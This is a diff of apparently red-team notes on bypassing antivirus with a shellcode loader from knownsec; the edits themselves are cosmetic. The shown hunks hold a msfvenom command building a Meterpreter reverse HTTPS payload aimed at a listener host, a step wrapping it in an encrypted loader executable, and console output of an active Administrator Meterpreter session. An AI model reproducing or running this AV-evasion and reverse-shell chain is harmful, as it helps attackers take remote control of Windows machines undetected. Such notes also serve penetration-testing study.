@@ -4,9 +4,9 @@ AV bypass using the obfuscation script 'Shellcodeloader'
 
 Source: => https://github.com/knownsec/shellcodeloader
 
-> ShellcodeLoader for windows to bypass AV.
+> Shellcode loader for Windows machines to bypass AV.
 > There are 13 shellcode loading modes in 32 bits and 12 shellcode loading modes in 64 bits.
-> Shellcode is automatically encrypted. The md5 of loaders that come from the same shellcode are different,because the generator uses time as seed
+> Shellcode is automatically encrypted. The md5 of loaders that come from the same shellcode are different, because the generator uses time as seed
   to randomly generate 128-bit keys for encryption.
   
   
@@ -21,8 +21,8 @@ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert
 LHOST=192.168.1.30 LPORT=443 -a x64 -f raw -o meterpreter-x64-reverse-https-raw.bin
 
 
-Step 2 - Generate a "shellcodeloader" embedding our shellcode that is encrypted
-------------------------------------------------------------------------------------
+Step 2 - Generate a "shellcode loader" (.exe) embedding our shellcode that is encrypted
+----------------------------------------------------------------------------------------
 
 Settings
 --------
@@ -138,7 +138,7 @@ Active sessions
 
   Id  Name  Type                     Information                        Connection
   --  ----  ----                     -----------                        ----------
-  1         meterpreter x64/windows  Laptop1\Administrator @ PO718687  192.168.1.30:443 -> 127.0.0.1  (192.168.1.113)
+  1         meterpreter x64/windows  Laptop1\Administrator @ Laptop1  192.168.1.30:443 -> 127.0.0.1  (192.168.1.113)
 
 msf6 auxiliary(server/socks_proxy) > seesions -i 1
 [-] Unknown command: seesions
